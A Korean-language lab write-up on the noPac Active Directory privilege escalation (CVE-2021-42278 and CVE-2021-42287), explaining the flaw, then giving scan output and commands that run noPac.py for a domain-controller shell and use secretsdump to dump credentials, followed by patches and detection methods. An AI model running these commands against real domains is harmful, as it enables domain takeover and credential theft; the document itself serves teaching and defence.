# noPac

> noPac (CVE-2021-42278 + CVE-2021-42287) 과 관련된 자세한 기술적인 정보는 블로그 글을 참고해주시기 바랍니다 - [https://blog.sunggwanchoi.com/cve-2021-42278gwa-42287-pateu-2/](https://blog.sunggwanchoi.com/cve-2021-42278gwa-42287-pateu-2/) .

### 개념&#x20;

CVE-2021-42278, CVE-2021-42287 (aka. noPac)은 2021년 11월에 발견된 액티브 디렉토리 권한 상승 취약점이다. 액티브 디렉토리 내 일반 유저에서 도메인 관리자로 권한 상승이 가능해지며, 도메인을 장악할 수 있게된다. 취약점 발표는 2021년 11월달에 이뤄졌지만, 12월 11일 noPac 이라는 개념증명 공격 툴이 공개되어 다시 주목받고 있다. 마이크로소프트 사에서는 이 두 취약점에 모두 CVSS 7.5 - 높음 위험도를 부여했다. 해당 취약점들은 2021년 11월 9일에 발표된 KB5008380, KB5008602, 혹은 KB5008102 보안 패치를 통해 해결할 수 있다.

### CVE-2021-42278 - sAMAccountName Spoofing

액티브 디렉토리 내 머신 계정은 일반적으로 sAMAccountName 뒤에 “$” 이 붙는다. 예를 들어 도메인 컨트롤러 DC01.choi.local 의 sAMAccountName은 DC01$ 이다. CVE-2021-42278은 머신 계정의 sAMAccountName를 수정할 때 검증이 제대로 이뤄지지 않아 “$”를 뺀 sAMAccountName을 만들어낼 수 있는 취약점이다. 예를 들어 DC01$에서 “$”가 빠진 DC01으로 지정할 수 있다.

42278만 놓고보면 심각한 취약점이 아니지만 이는 42287 취약점 공격에 필수적인 요소로 사용된다.

### CVE-2021-42287

액티브 디렉토리에서 머신 계정은 S4U2self 커버로스 요청을 통해 <특정 유저>가 자신(머신)의 특정 서비스에 접근가능한 서비스 티켓(ST)을 KDC로부터 받을 수 있다. 42287 취약점은 S4U2self를 요청한 머신의 sAMAccountName 이 액티브 디렉토리에 존재하지 않을시, KDC가 스스로 머신의 sAMAccountName 에 `$` 을 붙여 ST를 발급해주는 취약점이다.

이 취약점을 악용할 시 공격자는 도메인 컨트롤러와 sAMAccountName은 같지만 "$" 이 없는 머신 계정을 만든 뒤, TGT를 발급받고, 머신 계정의 sAMAccountName 을 다른 것으로 바꾼 뒤, <도메인 관리자>가 자신의 특정 서비스에 접근 가능한 S4U2self 요청을 KDC에게 보낸다. sAMAccountName이 바뀌었기 때문에 KDC는 액티브 디렉토리 내에서 이를 찾지 못하고, 결국 스스로 `$`을 붙여 (`DC01$`) <도메인 관리자>가 도메인 컨트롤러의 특정 서비스에 접근 가능한 서비스 티켓을 공격자에게 발급한다.

### 전제 조건&#x20;

1. 도메인 내 MAQ (MachineAccountQuota)의 값이 0이상 (기본값 10)으로 설정 되었을 시
2. noPac에 취약한 패치되지 않은 도메인 컨트롤러가 존재&#x20;
3. 도메인 유저 계정 존재&#x20;

### 실습&#x20;

실습에서는 noPac의 [파이썬 버전](https://github.com/Ridter/noPac)을 사용한다.&#x20;

#### 정보 수집&#x20;

CrackMapExec 이나 noPac 을 이용해 noPac에 취약한 도메인 컨트롤러가 있나 찾아본다.&#x20;

```
# CrackMapExec 
$ cme smb <DC-IP> -u <user> -p <pass> -d <domain> -M noPac 

$ cme smb 192.168.40.150 -u 'low' -p 'Password123!' -d choi.local -M nopac 
SMB         192.168.40.150  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:choi.local) (signing:True) (SMBv1:False)
SMB         192.168.40.150  445    DC01             [+] choi.local\low:Password123! 
NOPAC       192.168.40.150  445    DC01             TGT with PAC size 1373
NOPAC       192.168.40.150  445    DC01             TGT without PAC size 680
NOPAC       192.168.40.150  445    DC01             
NOPAC       192.168.40.150  445    DC01             VULNEABLE
NOPAC       192.168.40.150  445    DC01             Next step: https://github.com/Ridter/noPac

# noPac 
$ python3 scanner.py <domain>/<user>:<pass> -dc-ip <dc-ip> 
$ python3 scanner.py choi.local/low:'Password123!' -dc-ip 192.168.40.150
```

noPac 과 관련된 `unsupported hash type MD4` 에러가 있다면 `pip3 install pycryptodome` 을 설치한다.&#x20;

#### 공격&#x20;

```
# noPac으로 쉘 얻기  
$ python3 noPac.py <domain>/<user>:<pass> -dc-ip <dc-ip> -shell 

# nopac으로 커버로스 티켓 받아오기  
python3 noPac.py <domain>/<user>:<pass> -dc-ip <dc-ip>
export KRB5CCNAME=<full-path-.ccache-file>

# 티켓을 이용해 다양한 공격 
python3 secretsdumps.py <domain>/<user>@<target> -k -no-pass 
```

### 대응 방안&#x20;

* 다음의 보안 패치를 적용한다. 도메인 컨트롤러를 최신 버전으로 패치하면 자동으로 설치되니 굳이 찾아서 따로 설치를 할 필요는 없다.&#x20;
* **KB5008102 패치 -** 머신 계정의 sAMAccountName에는 무조건적으로 “$”이 들어가게끔 검증하도록 바뀌었다.
* **KB5008380 패치 -** S4U2self 요청시, TGT안에 PAC (Privileged Account Certificate) 이 들어가게끔 바뀌었다. TGT안의 PAC과 새롭게 발급하는 TGS안의 PAC이 일치하지 않으면 TGS를 사용해 서비스를 이용할 수 없도록 바뀌었다.

### 탐지 방안&#x20;

1. **sAMAccountName 검색**&#x20;

정말 특별한 경우가 아니라면 도메인 내 “$”이 없는 머신 계정은 존재해서는 안된다. 다음의 파워쉘 명령어를 이용해 “$”이 없는 머신 계정을 찾아본다. 결과가 나온다면 계정을 분석한 뒤 침해대응을 준비한다.

```
<# (https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/) #>
Get-ADComputer -Filter { samAccountName -notlike "*$" }
```

**2. 윈도우 이벤트 로그 - 머신 계정 생성 확인**&#x20;

다음의 윈도우 이벤트 로그를 확인한다.&#x20;

* 4741 - 머신 계정 생성
* 4742 - 머신 계정 수정 (sAMAccountName 이 “$” 이 없도록 수정되었는지 확인)
* 4743 - 머신 계정 삭제

만약 4741, 4742, 4743이 짧은 시간 (5\~10분) 동안 일어났고, 4742에서 “$”이 없는 sAMAccountName 수정이 확인되었다면, 공격 받았을 확률이 매우 높다.

**3. 11월 9일 패치에서 추가된 이벤트 로그 확인**

11월 9일 KB5008380 패치에서 마이크로소프트 사는 다음과 같은 이벤트 로그들을 추가했다. 이를 모니터링 룰에 적용한다.

* 35 - PAC without Attributes
* 36 - Ticket without a PAC
* 37 - Ticket without Requestor
* 38 - Requestor Mismatch (중요)

### 레퍼런스&#x20;

{% embed url="https://github.com/Ridter/noPac" %}
